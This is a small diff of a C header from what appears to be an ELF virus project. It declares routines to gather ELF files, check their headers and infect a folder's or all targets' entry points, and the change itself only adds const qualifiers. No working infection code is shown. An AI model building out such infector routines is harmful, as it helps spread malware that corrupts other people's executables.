@@ -58,8 +58,8 @@ char                        **get_elf_files(char **files, char *dir_path, int ty
 **      -> "SHARED"
 */
 char                        check_header_sanity(char *map, int size);
-char                        infect_folder_entry_point(char *self_name, const char *path);
-char                        infect_all_targets(char *argv);
+char                        infect_folder_entry_point(const char *self_name, const char *path);
+char                        infect_all_targets(const char *argv);
 
 /*
 **      -> ENTRY POINT INFECTION
